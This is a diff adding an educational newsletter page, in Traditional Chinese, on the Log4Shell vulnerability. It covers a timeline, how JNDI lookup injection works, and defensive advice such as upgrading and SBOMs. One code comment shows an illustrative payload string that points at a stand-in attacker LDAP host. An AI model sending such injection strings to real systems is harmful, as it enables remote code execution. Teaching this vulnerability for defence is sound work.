@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="zh-Hant-TW">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>第 2 期：Log4Shell｜資安週報</title>
+  <meta name="description" content="Java 日誌函式庫 Log4j 會解讀它記錄的字串，讓攻擊者只要讓伺服器記下一句話就能執行程式。">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+  <header class="site-header"><div class="inner">
+    <a class="site-title" href="../index.html">資安週報</a>
+    <nav class="site-nav"><a href="../index.html">所有期數</a><a href="../about.html">關於</a></nav>
+  </div></header>
+
+  <main>
+    <header class="issue-header">
+      <div class="meta">第 2 期 · <time datetime="2026-11-15">2026-11-15</time></div>
+      <h1>Log4Shell：一行日誌如何讓伺服器聽命於人</h1>
+      <ul class="tags">
+        <li class="tag cve">CVE-2021-44228</li>
+        <li class="tag">遠端程式碼執行</li>
+        <li class="tag">Java</li>
+      </ul>
+    </header>
+
+    <section id="tldr">
+      <h2>本期三句話</h2>
+      <ol>
+        <li>Log4j 2 會解析日誌內容中的 ${...}，可被誘導去載入遠端程式碼。</li>
+        <li>幾乎所有 Java 服務都用它記錄使用者輸入，影響面極廣。</li>
+        <li>升級到 Log4j 2.17.1 以上，並盤點系統裡藏著的舊版本。</li>
+      </ol>
+    </section>
+
+    <section id="deep-dive">
+      <h2>深講：當「記錄」變成「執行」</h2>
+
+      <h3>先備概念</h3>
+      <p class="analogy">想像一位祕書負責把來電內容寫進記事本。某天有人在電話裡說：「請去 XX 地址拿一份指令，照著做。」結果祕書不只記下來，還真的去拿、真的照做了。</p>
+      <p><strong>日誌（log）</strong>是程式運作時留下的紀錄，例如「使用者 alice 登入失敗」。為了方便，日誌函式庫常提供<strong>查找（lookup）</strong>功能：寫 <code>${java:version}</code> 會自動換成 Java 版本號。問題在於，Log4j 2 連<em>使用者輸入的內容</em>也會做這種替換。</p>
+      <p>而 <strong>JNDI</strong> 是 Java 用來「依名字向外部服務查詢物件」的介面，它能透過 LDAP 等協定從遠端伺服器取得物件，甚至取得要載入的類別。兩者一結合，就出事了。</p>
+
+      <h3>事件經過</h3>
+      <ol class="timeline">
+        <li><time datetime="2021-11-24">2021-11-24</time>阿里雲安全團隊研究員向 Apache 私下通報此漏洞。</li>
+        <li><time datetime="2021-12-09">2021-12-09</time>漏洞細節在網路上公開，大規模掃描與攻擊隨即出現，業界稱之為 Log4Shell。</li>
+        <li><time datetime="2021-12-10">2021-12-10</time>CVE-2021-44228 正式公開，CVSS 10.0，官方建議升級至修補版 2.15.0。</li>
+        <li><time datetime="2021-12-14">2021-12-14</time>發現 2.15.0 修補不完整（CVE-2021-45046），2.16.0 預設停用 JNDI 並移除訊息查找。</li>
+        <li><time datetime="2021-12">2021-12 下旬</time>陸續又修正兩個相關問題，最終建議版本為 2.17.1（Java 8 以上）。</li>
+      </ol>
+
+      <h3>技術機制</h3>
+      <p>攻擊的關鍵只有一句：<strong>任何會被記錄的使用者輸入，都可能是指令</strong>。例如 HTTP 標頭、帳號欄位、聊天訊息。</p>
+      <pre><code>// 很常見、看起來無害的程式碼
+logger.info("Login failed for user: " + username);
+
+// 若 username 是這樣的字串（示意，網址已無效化）：
+//   ${jndi:ldap://attacker.example/x}
+//
+// 受影響的 Log4j 會：
+// 1. 看到 ${jndi:...}，觸發 JNDI 查找
+// 2. 連線到攻擊者控制的 LDAP 伺服器
+// 3. 依回應去下載並載入攻擊者指定的 Java 類別
+// 4. 類別在伺服器上執行 → 遠端程式碼執行（RCE）</code></pre>
+      <p>攻擊者不需要帳號、不需要知道系統架構，只要找到一個「會被寫進日誌」的輸入欄位。這就是它被稱為近年最嚴重漏洞之一的原因。</p>
+
+      <h3>防禦與啟示</h3>
+      <div class="defense">
+        <section>
+          <h4>立即可做</h4>
+          <ul>
+            <li>將 <code>log4j-core</code> 升級到 2.17.1 以上（Java 8+）。</li>
+            <li>用軟體組成分析工具掃描相依套件，舊版常藏在別的 jar 檔裡面。</li>
+            <li>對外連線設白名單，伺服器不該主動連到任意 LDAP 位址。</li>
+          </ul>
+        </section>
+        <section>
+          <h4>長期該想</h4>
+          <ul>
+            <li>使用者輸入應永遠被當成「資料」，而不是「指令」。</li>
+            <li>維護軟體物料清單（SBOM），出事時才能快速回答「我們有沒有用到」。</li>
+            <li>方便的功能預設開啟，常常就是攻擊面。</li>
+          </ul>
+        </section>
+      </div>
+    </section>
+
+    <section id="briefs">
+      <h2>短訊</h2>
+      <article class="brief">
+        <time datetime="2021-12-10">2021-12-10</time>
+        <h3>Apache Log4j 官方安全公告</h3>
+        <p>官方頁面列出所有相關 CVE、受影響版本與建議升級版本，是確認修補狀態的權威依據。</p>
+        <p class="source">來源：<a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener">Apache Logging Services</a></p>
+      </article>
+      <article class="brief">
+        <time datetime="2021-12-10">2021-12-10</time>
+        <h3>NVD 收錄 CVE-2021-44228</h3>
+        <p>美國國家漏洞資料庫記錄了漏洞說明與 CVSS 10.0 評分。</p>
+        <p class="source">來源：<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">NVD</a></p>
+      </article>
+      <article class="brief">
+        <time datetime="2021-12-14">2021-12-14</time>
+        <h3>第一次修補不完整：CVE-2021-45046</h3>
+        <p>2.15.0 在部分非預設設定下仍可被利用，提醒我們「已修補」也要持續追蹤後續公告。</p>
+        <p class="source">來源：<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046" target="_blank" rel="noopener">NVD</a></p>
+      </article>
+      <article class="brief">
+        <time datetime="2021-12">2021-12</time>
+        <h3>CISA 彙整 Log4j 處置指引</h3>
+        <p>CISA 建立專頁整理偵測、修補與受影響產品清單，成為各組織盤點時的重要參考。</p>
+        <p class="source">來源：<a href="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance" target="_blank" rel="noopener">CISA</a></p>
+      </article>
+    </section>
+
+    <section id="glossary">
+      <h2>名詞小卡</h2>
+      <dl>
+        <div><dt>日誌（log）</dt><dd>程式執行時留下的文字紀錄，用於除錯與稽核。</dd></div>
+        <div><dt>JNDI（Java Naming and Directory Interface）</dt><dd>Java 依名稱向外部目錄服務查詢資源的介面。</dd></div>
+        <div><dt>LDAP</dt><dd>一種目錄服務協定，常用於帳號管理，也可被 JNDI 用來取得遠端物件。</dd></div>
+        <div><dt>遠端程式碼執行（RCE, Remote Code Execution）</dt><dd>攻擊者能讓遠端主機執行自己指定的程式，屬最嚴重的漏洞類型之一。</dd></div>
+        <div><dt>SBOM（Software Bill of Materials）</dt><dd>軟體物料清單，列出軟體用到的所有元件與版本。</dd></div>
+      </dl>
+    </section>
+
+    <nav class="issue-nav">
+      <a href="001-xz-backdoor.html">← 第 1 期</a>
+      <a href="../index.html">所有期數</a>
+      <span class="disabled">下一期 →</span>
+    </nav>
+  </main>
+
+  <footer class="site-footer">資安週報 · 內容僅供教育用途 · 事實以文中來源為準</footer>
+</body>
+</html>
